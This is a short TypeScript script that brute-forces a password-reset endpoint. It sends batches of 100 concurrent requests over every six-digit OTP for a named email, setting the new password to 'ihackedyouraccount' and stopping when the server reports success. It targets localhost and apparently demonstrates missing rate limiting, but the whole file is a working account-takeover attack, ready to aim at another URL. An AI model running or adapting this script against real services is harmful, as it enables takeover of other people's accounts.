import axios from "axios";

async function sendRequest(otp: string) {
    const data = JSON.stringify({
        email: "subrat@gmail.com",
        otp: otp,
        newPassword: "ihackedyouraccount"
    });

    const config = {
        method: "post",
        maxBodyLength: Infinity,
        url: "http://localhost:3000/verify-otp",
        headers: {
            "Content-Type": "application/json"
        },
        data: data
    };

    return axios.request(config);
}

async function main() {
    for (let i = 0; i < 1000000; i += 100) {

        const promises = [];

        for (let j = i; j < i + 100 && j < 1000000; j++) {

            promises.push(
                sendRequest(j.toString())
                    .then((ans) => {

                        // Only show valid OTP
                        if (
                            ans.data.message ===
                            "OTP verified successfully, Password changed"
                        ) {
                            console.log("Valid OTP:", j);

                            // Stop the program
                            process.exit(0);
                        }

                    })
                    .catch(() => {})
            );
        }

        await Promise.all(promises);
    }

    console.log("OTP not found");
}

main();